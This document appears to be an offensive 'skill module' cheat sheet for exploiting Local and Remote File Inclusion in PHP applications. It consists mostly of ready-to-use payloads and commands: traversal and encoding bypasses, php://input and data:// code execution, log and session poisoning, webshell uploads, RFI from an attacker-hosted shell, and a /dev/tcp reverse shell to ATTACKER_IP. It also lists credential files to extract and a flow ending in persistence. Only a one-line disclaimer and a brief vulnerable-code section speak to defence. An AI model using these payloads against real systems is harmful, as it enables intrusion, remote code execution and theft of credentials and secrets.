# LFI/RFI & File Inclusion Complete Arsenal

> Bxploit skill module — Local/Remote File Inclusion exploitation from discovery through full RCE chains.

## Disclaimer

For authorized penetration testing and educational purposes only. Always obtain written permission before testing.

---

## 1. Basic Path Traversal

### 1.1 Standard Directory Traversal Sequences

```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
..\/..\/..\/etc/passwd
..;/..;/..;/etc/passwd
```

### 1.2 Absolute Path Inclusion

```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/version
/proc/cmdline
```

### 1.3 Windows Path Traversal

```
..\..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
C:\boot.ini
C:\windows\win.ini
C:\windows\system32\config\sam
```

### 1.4 Depth-Exhaustive Traversal

When you don't know the depth, use excessive traversal — the OS stops at root:

```
../../../../../../../../../../../../../../../../etc/passwd
```

Generate payloads with different depths:

```bash
for i in $(seq 1 15); do echo "$(printf '../%.0s' $(seq 1 $i))etc/passwd"; done
```

---

## 2. PHP Stream Wrappers

### 2.1 php://filter — Source Code Disclosure

Read PHP source as base64 (bypasses execution):

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config/database.php
```

Decode result:

```bash
echo "PD9waHAgLy8gY29uZmlnIC4uLg==" | base64 -d
```

Alternative filter chains for WAF bypass:

```
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.quoted-printable-encode/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
```

Chained filters:

```
php://filter/string.rot13|convert.base64-encode/resource=index.php
php://filter/convert.iconv.utf-8.utf-16le|convert.base64-encode/resource=index.php
```

### 2.2 php://input — POST Body Execution

Requires `allow_url_include=On`. Send via POST:

```bash
curl -X POST "http://target.com/vuln.php?page=php://input" \
  -d '<?php system("id"); ?>'
```

```bash
curl -X POST "http://target.com/vuln.php?page=php://input" \
  -d '<?php echo shell_exec("cat /etc/passwd"); ?>'
```

Reverse shell via php://input:

```bash
curl -X POST "http://target.com/vuln.php?page=php://input" \
  -d '<?php system("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\""); ?>'
```

### 2.3 data:// Wrapper — Inline Code Execution

Requires `allow_url_include=On`:

```
data://text/plain,<?php system("id"); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==
```

Base64-encode your payload to bypass WAF:

```bash
echo -n '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+
```

```
http://target.com/vuln.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id
```

### 2.4 expect:// Wrapper — Direct Command Execution

Requires `expect` extension loaded (rare but devastating):

```
expect://id
expect://ls+-la
expect://cat+/etc/passwd
```

```bash
curl "http://target.com/vuln.php?page=expect://id"
```

### 2.5 zip:// and phar:// Wrappers

Upload a ZIP containing a PHP shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > cmd.php
zip shell.zip cmd.php
# Upload shell.zip as an image or allowed file type
```

Include via zip wrapper:

```
zip:///var/www/html/uploads/shell.zip%23cmd.php
zip://shell.zip%23cmd.php
```

Phar deserialization (requires crafted phar):

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

```
phar:///var/www/html/uploads/shell.jpg/test.txt
```

### 2.6 file:// Wrapper

Explicit local file access:

```
file:///etc/passwd
file:///proc/self/environ
file:///var/log/apache2/access.log
```

---

## 3. Log Poisoning — LFI to RCE

### 3.1 Apache Access Log Poisoning

Default log paths:

```
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/httpd/access_log
/var/log/httpd-access.log
/usr/local/apache/log/access_log
/usr/local/apache2/log/access_log
```

Step 1 — Inject PHP into User-Agent:

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://target.com/"
```

Step 2 — Trigger via LFI:

```
http://target.com/vuln.php?page=/var/log/apache2/access.log&cmd=id
```

Alternative injection via Referer:

```bash
curl -H "Referer: <?php system(\$_GET['cmd']); ?>" "http://target.com/"
```

Netcat-based injection for cleaner control:

```bash
nc target.com 80
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
Host: target.com
Connection: close

```

### 3.2 Apache Error Log Poisoning

Default paths:

```
/var/log/apache2/error.log
/var/log/apache/error.log
/var/log/httpd/error_log
```

Trigger a 404 error with PHP payload in the URL:

```bash
curl "http://target.com/<?php system(\$_GET['cmd']); ?>"
```

Then include the error log:

```
http://target.com/vuln.php?page=/var/log/apache2/error.log&cmd=id
```

### 3.3 Nginx Access Log Poisoning

Default paths:

```
/var/log/nginx/access.log
/var/log/nginx/error.log
/usr/local/nginx/log/access.log
```

Same injection technique:

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://target.com/"
```

```
http://target.com/vuln.php?page=/var/log/nginx/access.log&cmd=id
```

### 3.4 SSH Log Poisoning (auth.log)

Path:

```
/var/log/auth.log
/var/log/secure
```

Inject PHP into SSH username:

```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```

The failed login attempt writes the "username" into auth.log. Then include it:

```
http://target.com/vuln.php?page=/var/log/auth.log&cmd=id
```

### 3.5 Mail Log Poisoning

Path:

```
/var/log/mail.log
/var/log/maillog
/var/spool/mail/www-data
```

Send email with PHP in subject or body:

```bash
telnet target.com 25
HELO attacker
MAIL FROM:<attacker@evil.com>
RCPT TO:<www-data@target.com>
DATA
Subject: <?php system($_GET['cmd']); ?>
.
QUIT
```

Or via sendmail/swaks:

```bash
swaks --to www-data@target.com --from attacker@evil.com \
  --header "Subject: <?php system(\$_GET['cmd']); ?>" \
  --server target.com
```

Include the mail log:

```
http://target.com/vuln.php?page=/var/log/mail.log&cmd=id
```

### 3.6 FTP Log Poisoning

Path:

```
/var/log/vsftpd.log
/var/log/proftpd/proftpd.log
```

Connect with a PHP payload as the username:

```bash
ftp target.com
Name: <?php system($_GET['cmd']); ?>
Password: anything
```

---

## 4. /proc Filesystem Exploitation

### 4.1 /proc/self/environ

Contains environment variables including HTTP headers (Apache mod_cgi, CGI mode):

```
http://target.com/vuln.php?page=/proc/self/environ
```

Inject via User-Agent:

```bash
curl -A "<?php system('id'); ?>" "http://target.com/vuln.php?page=/proc/self/environ"
```

### 4.2 /proc/self/fd — File Descriptor Bruteforce

Apache keeps log file descriptors open. Bruteforce to find them:

```bash
for fd in $(seq 0 50); do
  echo "--- fd $fd ---"
  curl -s "http://target.com/vuln.php?page=/proc/self/fd/$fd"
done
```

With wfuzz:

```bash
wfuzz -z range,0-50 -u "http://target.com/vuln.php?page=/proc/self/fd/FUZZ" --hl 0
```

After finding a writable fd (often 2 = stderr, or the access log fd), poison it:

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://target.com/"
curl "http://target.com/vuln.php?page=/proc/self/fd/11&cmd=id"
```

### 4.3 /proc/self/cmdline

Reveals the running command (process arguments):

```
/proc/self/cmdline
/proc/1/cmdline
```

### 4.4 /proc/self/maps and /proc/self/mem

Memory map + direct memory read (useful for credential extraction):

```
/proc/self/maps
```

### 4.5 /proc/self/cwd

Symlink to the working directory — useful for discovering webroot:

```
/proc/self/cwd/index.php
/proc/self/cwd/config.php
/proc/self/cwd/../config/database.yml
```

---

## 5. Null Byte Injection

### 5.1 Classic Null Byte (PHP < 5.3.4)

When the application appends an extension:

```php
include($_GET['page'] . '.php');
```

Terminate with null byte:

```
../../../etc/passwd%00
../../../etc/passwd\0
```

### 5.2 URL-Encoded Null Byte Variants

```
%00
%2500           (double-encoded null)
\x00
\u0000
```

### 5.3 Null Byte + Extension Bypass

```
../../../etc/passwd%00.php
../../../etc/passwd%00.html
../../../etc/passwd%00.jpg
```

### 5.4 Path Truncation (PHP < 5.3)

PHP has a max path length (~4096 on Linux). Pad to truncate the appended extension:

```bash
python3 -c "print('../../../etc/passwd' + '/.' * 2048)"
```

```
../../../etc/passwd/./././././././. (repeated to 4096+ chars)
```

---

## 6. Encoding Bypass Techniques

### 6.1 URL Encoding (Single)

```
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### 6.2 Double URL Encoding

```
..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### 6.3 UTF-8 / Unicode Encoding

```
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
```

Overlong UTF-8 sequences for `/`:

```
%c0%af          (2-byte overlong /)
%e0%80%af      (3-byte overlong /)
%c0%2f          (modified 2-byte)
```

### 6.4 16-bit Unicode Encoding (IIS)

```
..%u2215..%u2215..%u2215etc%u2215passwd
..%u2216..%u2216..%u2216etc%u2216passwd
```

### 6.5 Mixed Encoding

Combine encoded and non-encoded characters:

```
..%2f..%2f..%2f/etc/passwd
../%2e%2e/etc/passwd
.%2e/.%2e/.%2e/etc/passwd
```

---

## 7. Filter and WAF Bypass

### 7.1 Bypassing `../` Removal (Non-Recursive)

If the app strips `../` once:

```
....//....//....//etc/passwd
..../..../..../etc/passwd
....\/....\/....\/etc/passwd
```

### 7.2 Bypassing Keyword Blocklists

Blocked: `etc/passwd` — use self-referencing paths:

```
/etc/./passwd
/etc/passwd/.
/etc//passwd
/./etc/./passwd
/etc/something/../passwd
```

### 7.3 Case Variations (Windows)

```
..\..\..\..\WINDOWS\system32\drivers\etc\hosts
..\..\..\..\WiNdOwS\SyStEm32\DrIvErS\eTc\HoStS
```

### 7.4 Slash Substitution

```
..;/..;/..;/etc/passwd        (Tomcat / Jetty normalization)
..\..\..\etc\passwd            (backslash on misconfigured parsers)
..//..//..//etc/passwd         (double slash)
```

### 7.5 Bypassing Extension Whitelist

When application requires `.php` extension — use null byte (old PHP), wrappers, or path tricks:

```
php://filter/convert.base64-encode/resource=config
data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==
zip://uploads/shell.zip%23cmd.php
```

---

## 8. Remote File Inclusion (RFI)

Requires `allow_url_include=On` and `allow_url_fopen=On`.

### 8.1 Basic RFI

Host a shell on your server:

```bash
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.txt
python3 -m http.server 8080
```

```
http://target.com/vuln.php?page=http://ATTACKER_IP:8080/shell.txt&cmd=id
```

Use `.txt` extension — `.php` would execute on your server instead of target.

### 8.2 RFI with Null Byte

If `.php` is appended:

```
http://target.com/vuln.php?page=http://ATTACKER_IP:8080/shell.txt%00
```

### 8.3 RFI with Query String Trick

Neutralize appended extension using `?` or `#`:

```
http://target.com/vuln.php?page=http://ATTACKER_IP:8080/shell.txt?
http://target.com/vuln.php?page=http://ATTACKER_IP:8080/shell.txt%23
```

The appended `.php` becomes part of the query string fragment, ignored by your server.

### 8.4 SMB-Based RFI (Windows Targets)

Host an SMB share:

```bash
impacket-smbserver share /tmp/share -smb2support
```

Place shell.php in /tmp/share/:

```
http://target.com/vuln.php?page=\\ATTACKER_IP\share\shell.php
```

### 8.5 FTP-Based RFI

```bash
python3 -m pyftpdlib -p 21 -w
```

```
http://target.com/vuln.php?page=ftp://ATTACKER_IP/shell.txt
```

---

## 9. PHP Filter Chain — Arbitrary Write / RCE Without File Upload

The `php://filter` chain-based RCE technique builds an arbitrary string from chained `iconv` conversions (no `allow_url_include` needed).

### 9.1 Using php_filter_chain_generator

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

This outputs a massive `php://filter/convert.iconv...` chain that, when included, produces the PHP code without needing any file on disk.

Usage:

```
http://target.com/vuln.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...(generated chain)...&cmd=id
```

### 9.2 Manual Filter Chain Construction

The technique chains `iconv` character set conversions to produce specific bytes:

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|...|/resource=php://temp
```

Each conversion step appends or transforms bytes. The generator automates the combinatorics.

---

## 10. LFI to RCE Chains

### 10.1 Via /proc/self/environ

```bash
curl -A "<?php system('id'); ?>" "http://target.com/vuln.php?page=../../../../proc/self/environ"
```

### 10.2 Via Log Poisoning (see Section 3)

Inject → Include → Execute. Works with Apache, Nginx, SSH, mail, FTP logs.

### 10.3 Via Session Files

PHP session files location:

```
/var/lib/php/sessions/sess_<PHPSESSID>
/var/lib/php5/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>
/var/tmp/sess_<PHPSESSID>
C:\Windows\Temp\sess_<PHPSESSID>
```

Step 1 — Inject PHP into a session variable (e.g., username field that's stored in `$_SESSION`):

```bash
curl -b "PHPSESSID=attacker_session" \
  "http://target.com/login.php" \
  -d "username=<?php system(\$_GET['cmd']); ?>&password=anything"
```

Step 2 — Include the session file:

```
http://target.com/vuln.php?page=/var/lib/php/sessions/sess_attacker_session&cmd=id
```

### 10.4 Via phpinfo() + Race Condition

When `phpinfo()` is accessible and LFI exists (no other writable vector):

1. Upload a multipart file to `phpinfo()` page — PHP stores it as a temp file
2. `phpinfo()` reveals the temp file path
3. Race to include the temp file before PHP garbage-collects it

Tool: `lfi2rce_phpinfo.py` (available in various exploit repos)

```bash
python3 lfi2rce_phpinfo.py --target http://target.com/vuln.php --phpinfo http://target.com/phpinfo.php --payload '<?php system("id"); ?>'
```

### 10.5 Via Temporary File Upload

During any multipart POST, PHP creates `/tmp/php[A-Za-z0-9]{6}`:

```bash
# Brute-force the temp file name
for i in $(seq 1 1000); do
  curl "http://target.com/vuln.php?page=/tmp/php$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | head -c6)"
done
```

### 10.6 Via File Upload + LFI

If you can upload any file (avatar, document):

```bash
# Create a PHP shell disguised as an image
echo -e '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png
# Upload as profile picture, then include
```

```
http://target.com/vuln.php?page=uploads/shell.png&cmd=id
```

### 10.7 Via Pearcmd.php (PHP Pear)

If `pearcmd.php` exists on the system (common in Docker PHP images):

```
http://target.com/vuln.php?page=/usr/local/lib/php/pearcmd.php&+config-create+/&/<?php system($_GET['cmd']); ?>+/tmp/evil.php
```

Then include:

```
http://target.com/vuln.php?page=/tmp/evil.php&cmd=id
```

### 10.8 Via PHP Crash + Temp File Persistence

Force a PHP segfault while uploading — temp file won't be cleaned:

```bash
python3 -c "
import requests
# Upload while triggering a crash (e.g., via known segfault bug)
files = {'file': ('shell.php', '<?php system(\$_GET[\"cmd\"]); ?>')}
requests.post('http://target.com/crash_endpoint.php', files=files)
"
```

Then brute-force `/tmp/php*`.

---

## 11. High-Value Files to Extract

### 11.1 Linux

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/crontab
/etc/network/interfaces
/etc/resolv.conf
/proc/version
/proc/self/environ
/proc/self/cmdline
/proc/sched_debug
/home/<user>/.ssh/id_rsa
/home/<user>/.ssh/authorized_keys
/home/<user>/.bash_history
/home/<user>/.mysql_history
/root/.bash_history
/root/.ssh/id_rsa
/var/www/html/wp-config.php
/var/www/html/.env
/var/www/html/config.php
/var/www/html/configuration.php
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/mysql/my.cnf
/opt/lampp/etc/httpd.conf
/usr/local/etc/php/php.ini
```

### 11.2 Windows

```
C:\boot.ini
C:\windows\win.ini
C:\windows\system.ini
C:\windows\system32\config\sam
C:\windows\system32\config\system
C:\windows\system32\config\software
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\php\php.ini
C:\Users\<user>\.ssh\id_rsa
C:\ProgramData\MySQL\MySQL Server 8.0\my.ini
```

### 11.3 Application Config Files

```
.env
.env.local
.env.production
config/database.yml
config/secrets.yml
wp-config.php
configuration.php          (Joomla)
sites/default/settings.php (Drupal)
app/etc/local.xml          (Magento)
config/app.php             (Laravel)
.git/config
.svn/entries
composer.json
package.json
Dockerfile
docker-compose.yml
```

---

## 12. Automated Tools

### 12.1 LFISuite

```bash
python3 lfiSuite.py
# Interactive — select scan mode, provide URL with parameter
```

### 12.2 Kadimus

```bash
kadimus -u "http://target.com/vuln.php?page=FILE" -A "<?php system('id'); ?>"
```

### 12.3 fimap

```bash
fimap -u "http://target.com/vuln.php?page=index"
fimap -u "http://target.com/vuln.php?page=index" --enable-rfi
```

### 12.4 dotdotpwn

```bash
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -k "root:" -d 10
```

### 12.5 Burp Suite Intruder

Load a wordlist of traversal payloads into Intruder, fuzz the vulnerable parameter. Use the SecLists LFI wordlists:

```
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
```

### 12.6 ffuf / wfuzz for LFI Discovery

```bash
ffuf -u "http://target.com/vuln.php?page=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fs 0

wfuzz -u "http://target.com/vuln.php?page=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  --hl 0
```

---

## 13. Quick Reference — Cheat Sheet

| Technique | Payload | Requirement |
|---|---|---|
| Basic LFI | `../../../../etc/passwd` | `include()` / `require()` |
| php://filter base64 | `php://filter/convert.base64-encode/resource=config` | None |
| php://input | `php://input` + POST body | `allow_url_include=On` |
| data:// | `data://text/plain;base64,<b64_shell>` | `allow_url_include=On` |
| expect:// | `expect://id` | `expect` extension |
| zip:// | `zip://uploads/shell.zip%23cmd.php` | Upload capability |
| phar:// | `phar://uploads/shell.jpg/cmd.php` | Upload + phar craft |
| Log poisoning | Inject UA → include log | LFI + log read access |
| SSH log poisoning | `ssh '<?php …?>'@target` → include auth.log | LFI + SSH + log read |
| /proc/self/environ | Include with poisoned UA | CGI/mod_cgi mode |
| Session poisoning | Inject via session → include sess_ file | Session write access |
| Filter chain RCE | `php://filter/convert.iconv...` chain | php_filter_chain_generator |
| Null byte | `../../../../etc/passwd%00` | PHP < 5.3.4 |
| Double encoding | `..%252f..%252f` | Double-decode in app |
| pearcmd.php | Include pearcmd + config-create trick | pearcmd.php present |
| RFI basic | `http://attacker/shell.txt` | `allow_url_include=On` |
| RFI via SMB | `\\attacker\share\shell.php` | Windows target |

---

## 14. Detection Indicators & Vulnerable Code Patterns

### 14.1 Vulnerable PHP Patterns

```php
// Direct user input in include — critical
include($_GET['page']);
include($_GET['page'] . '.php');
require($lang . '/header.php');
include("themes/" . $_COOKIE['theme']);

// Slightly filtered but still vulnerable
$page = str_replace('../', '', $_GET['page']);  // non-recursive strip
include($page);
```

### 14.2 Signs of LFI in Recon

- URL parameters like `?page=`, `?file=`, `?path=`, `?include=`, `?template=`, `?lang=`, `?doc=`, `?view=`, `?content=`, `?module=`, `?load=`
- Error messages revealing file paths: `Warning: include(...)`, `failed to open stream`
- Blank pages when a file parameter value is invalid (silent include failure)

### 14.3 Common Parameter Names to Fuzz

```
page, file, path, include, template, lang, language, doc, document,
view, content, module, load, folder, dir, style, theme, layout,
pdf, report, design, display, cat, action, board, prefix, string,
fn, func, name, read, fetch, show, navigation, site, flavor, url
```

---

## 15. Methodology — LFI/RFI Attack Flow

```
1. DISCOVER  → Identify parameters accepting file paths
2. CONFIRM   → Test with ../../../../etc/passwd or known files
3. EXTRACT   → Use php://filter to read source code, configs, credentials
4. ESCALATE  → Attempt RCE via:
               a) php://input or data:// (if allow_url_include)
               b) Log poisoning (Apache/Nginx/SSH/mail)
               c) Session poisoning
               d) /proc/self/environ
               e) php_filter_chain (no special requirements)
               f) Upload + LFI
               g) pearcmd.php trick
               h) Temp file race condition
5. PERSIST   → Write webshell, establish reverse shell
6. REPORT    → Document with PoC, CVSS score, remediation
```
